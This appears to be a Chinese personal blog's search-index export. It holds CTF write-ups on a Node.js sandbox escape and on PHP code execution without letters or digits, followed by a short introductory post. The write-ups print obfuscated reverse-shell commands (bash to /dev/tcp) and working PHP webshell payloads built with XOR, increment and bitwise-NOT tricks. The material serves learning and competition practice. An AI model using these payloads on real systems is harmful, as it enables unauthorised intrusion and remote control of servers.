class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> content = <span class="string">`;)&quot;&#x27;&#125;i-,hsab&#123;|&#125;d-,46esab&#123;|&#125;d-,46esab&#123;|&#125;=0TRqp0KBRUSwo0MidXODNGc5M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce&#123;&#x27; c- hsab&quot;(cexe;)&quot;ssecorp_dlihc&quot;(eriuqer = &#125; cexe &#123; tsnoc`</span>;</span><br><span class="line"><span class="keyword">const</span> reversedContent = content.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line"> <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span>))();</span><br><span class="line"> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>, reversedContent);</span><br><span class="line">        <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>).<span class="title function_">fork</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>content的值反序输出为：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const &#123; <span class="keyword">exec</span> &#125; = <span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;bash -c &#x27;&#123;echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT0=&#125;|&#123;base64,-d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT<span class="number">0</span>=的解码为bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>具体分析：</p><blockquote><ol><li><code>bash -c</code> 是 Bash 命令的一种用法，其中 <code>-c</code> 选项表示后面跟着的字符串是一个命令或者是一个要执行的命令字符串。</li><li><code>&#123;base64,-d&#125;</code>：使用 <code>base64</code> 命令进行反向解码，将前一个命令的输出（经过 Base64 编码的 Bash 代码）解码为原始的 Bash 代码。</li></ol></blockquote><h3 id="方法三：replace"><a href="#方法三：replace" class="headerlink" title="方法三：replace"></a>方法三：replace</h3><p>LaoGong真的nb</p><p>因为有try，可以抛出异常来逃逸，payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法四：原型链污染"><a href="#方法四：原型链污染" class="headerlink" title="方法四：原型链污染"></a>方法四：原型链污染</h3><p>官方wp：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><img src="/img/image-20240331134428015.png" alt="image-20240331134428015"></p><p>说实话这个<code>hack.js</code>不知道咋看出来的</p><p><img src="/img/image-20240331134556826.png" alt="image-20240331134556826"></p><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><a href="https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5">https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136980871">https://blog.csdn.net/uuzeray/article/details/136980871</a></p><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQdK2K35D=Kt4D&alichlgref=https://www.google.com.hk/#toc-3">https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQdK2K35D%3DKt4D&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-3</a></p><p><a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>]]></content>
      
      
      <categories>
          
          <category> web学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无数字和字母RCE</title>
      <link href="/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/"/>
      <url>/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无数字和字母RCE"><a href="#无数字和字母RCE" class="headerlink" title="无数字和字母RCE"></a>无数字和字母RCE</h1><p>最原始的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或"></a>1.异或</h3><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出  ~</p><p>计算过程：首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63，然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code>，接下来就进行运算，异或的运算规则是相同为0，不同为1</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>:      <span class="number">1000001</span></span><br><span class="line">?:      <span class="number">0111111</span>(少一位，前面补<span class="number">0</span>即可) </span><br><span class="line">结果：   <span class="number">1111110</span></span><br></pre></td></tr></table></figure><p>异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AB&quot;</span>^<span class="string">&quot;11&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出 ps</p><hr><h3 id="2-自增"><a href="#2-自增" class="headerlink" title="2.自增"></a>2.自增</h3><p>在php中，在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。并且字符变量只能递增不能递减，并且只支持字母数字的ASCII的自增，对其他字符自增无效。简单来说，就是我们可以通过自增来获取我们想要的字母。即<code>‘a++&#39;--&gt;&#39;b</code>‘;<code>&#39;b&#39;++--&gt;&#39;c&#39;</code>;<code>&#39;A&#39;++--&gt;&#39;B&#39;</code></p><p>而php还有一个特性，字符串和数组拼接会返回Array。这样我们就获取到了字母。<strong>限制了字母和数字，但是我们可以传入空格</strong></p><p><img src="/img/3.png" alt="屏幕截图 2024-02-04 191838"></p><p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code></p><p><img src="/img/4.png" alt="image-20240204192356382"></p><p>得到字母后就可以开始构造，例如<code>system(ls)</code>这样的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>_=[].<span class="string">&#x27;&#x27;</span>;<span class="symbol">$</span>_=<span class="symbol">$</span>_[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>__=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>___=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_=<span class="symbol">$</span>___.<span class="symbol">$</span>__.<span class="symbol">$</span>_;<span class="symbol">$</span>_=<span class="string">&#x27;_&#x27;</span>.<span class="symbol">$</span>_;<span class="symbol">$</span><span class="symbol">$</span>_[_](<span class="symbol">$</span><span class="symbol">$</span>_[__]);</span><br></pre></td></tr></table></figure><p><strong>依情况看是否进行url编码</strong></p><p>最后用GET方式对变量<code>_</code>和<code>__</code>传参就行</p><hr><h3 id="3-取反"><a href="#3-取反" class="headerlink" title="3.取反"></a>3.取反</h3><p>取反其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p><p>php中取反符号为<code>~</code>，当使用按位取反操作符 ‘~’ 时，它会翻转一个整数的所有位，举例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">10</span>; <span class="comment">// 二进制表示为 0000 1010</span></span><br><span class="line"><span class="variable">$y</span> = ~<span class="variable">$x</span>; <span class="comment">// 按位取反后为 1111 0101</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出结果为 -11</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出结果为-11，详细取反运算见文章<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">PHP ~(按位取反)位运算符</a></p><p>一个简单的php取反脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data1</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;assert&#x27;</span>));<span class="comment">//通过两次取反运算得到assert</span></span><br><span class="line"><span class="variable">$data2</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;_POST&#x27;</span>));<span class="comment">//通过两次取反运算得到_POST</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>故构造payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);    //这里利用取反符号把它取回来，<span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);      //<span class="variable">$__</span>=_POST</span><br><span class="line"><span class="variable">$___</span>=$<span class="variable">$__</span>;                   //<span class="variable">$___</span>=<span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);                 //assert(<span class="variable">$_POST</span>[<span class="number">_</span>]);</span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);<span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);</span><br></pre></td></tr></table></figure><p>再进行POST传参，传入自己想执行的命令</p><hr><h3 id="更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell"><a href="#更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell" class="headerlink" title="更多自增知识点和赛题见文章从CTFShow[RCE挑战]中学习无字母数字构造webshell"></a>更多自增知识点和赛题见文章<a href="https://xz.aliyun.com/t/11929?time__1311=mqmx0DBG0QExlxx2DU27HYG=G8iF=x&alichlgref=https://www.google.com/#toc-14">从CTFShow[RCE挑战]中学习无字母数字构造webshell</a></h3><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>一道简单的例题：</p><p><strong>[HUBUCTF 2022 新生赛]HowToGetShell</strong></p><p><img src="/img/1.png" alt="image-20240204190451810"></p><p>过滤了字母，因为php5中的assert函数会将括号里面的字符串当作php代码来执行。因此我们可以构造出<code>assert($_GET[6])</code>，因为很多都是不可见的字符，所以说就先url编码了一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ;s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">G:<span class="string">&#x27;%3C&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;E:<span class="string">&#x27;%3E&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>;</span><br><span class="line"><span class="regexp">//</span>拼接起来</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40%7B%7B%7B%7E%7C&#x27;</span>^<span class="string">&#x27;%21%08%08%1E%0C%08&#x27;</span>);  <span class="regexp">//</span> <span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$_1</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%3C%3E%0B&#x27;</span>^<span class="string">&#x27;%7B%7B%5F&#x27;</span>);<span class="regexp">//</span><span class="variable">$_1</span>=_GET</span><br><span class="line"><span class="variable">$_2</span>=$<span class="variable">$_1</span>; <span class="comment">#$_2=$_GET</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$_2</span>[<span class="number">6</span>]);  <span class="regexp">//</span>assert(<span class="variable">$_GET</span>[<span class="number">6</span>])</span><br></pre></td></tr></table></figure><p>最后在环境变量中找到flag</p><p><img src="/img/2.png" alt="image-20240204190946852"></p><p>最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>:?<span class="number">6</span>=phpinfo();</span><br><span class="line"><span class="attribute">POST</span>:mess=$_=(&#x27;%<span class="number">40</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>E%<span class="number">7</span>C&#x27;^&#x27;%<span class="number">21</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">1</span>E%<span class="number">0</span>C%<span class="number">08</span>&#x27;);$_1=&#x27;_&#x27;.(&#x27;%<span class="number">3</span>C%<span class="number">3</span>E%<span class="number">0</span>B&#x27;^&#x27;%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">5</span>F&#x27;);$_2=$$_1;$_($_2[<span class="number">6</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>这个博客是终于搭好了，本来是搭好了的，那个文章封面图总是报错，我也知道为啥，现在也没弄好，先不管了。本站是基于hexo+github搭建的，主题是butterfly。这个站比较简洁，没有做很多美化，因为主要用作学习交流，弄那么花也不方便看。<del>其实是怕报错和懒</del></p><p>建个博客很简单，对着大佬的文章库库ctrlcv就行了，以下是我在建站时参考的文章</p><p><a href="https://blog.csdn.net/qq_58608526/article/details/124652412">Hexo+Github博客搭建教程</a></p><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">【Hexo】Hexo搭建Butterfly主题并快速美化</a></p><p>这个博客以后可能会发一些我个人学习方面的东西，如果有疑问或者想和我交流的可以联系我，联系方式Q：3358756550</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
